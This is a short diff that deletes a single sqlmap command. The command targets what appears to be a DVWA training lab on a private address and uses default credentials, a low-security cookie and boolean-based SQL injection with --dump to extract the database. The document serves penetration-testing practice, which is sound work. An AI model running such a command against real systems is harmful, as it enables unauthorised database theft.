@@ -1,8 +1,0 @@
-sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
-  --forms \
-  --data="username=admin&password=password&Login=Login" \
-  --cookie="security=low" \
-  --batch --dump --level=2 --risk=2 \
-  --dbms=mysql --technique=B \
-  --test-filter="id" \
-  --flush-session
